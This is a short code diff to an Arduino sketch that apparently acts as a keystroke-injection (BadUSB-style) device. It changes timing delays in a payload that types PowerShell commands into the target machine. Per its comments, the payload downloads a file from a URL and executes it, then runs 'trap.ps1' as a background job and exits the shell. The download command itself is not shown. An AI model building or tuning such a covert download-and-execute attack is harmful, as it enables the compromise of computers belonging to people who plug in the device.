@@ -37,7 +37,7 @@ void setup() {
   // Keyboard.press(121);
   Keyboard.press(KEY_Y);
   Keyboard.releaseAll();
-  delay(300);
+  delay(600);
 
   // Run PowerShell command: save file at $url as $file and execute it
   // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
@@ -49,6 +49,7 @@ void setup() {
   Keyboard.click(KEY_RETURN);
   Keyboard.print("Start-Job -ScriptBlock { ./trap.ps1 }");
   Keyboard.click(KEY_RETURN);
+  delay(100);
   Keyboard.print("exit;");
   Keyboard.click(KEY_RETURN);
 
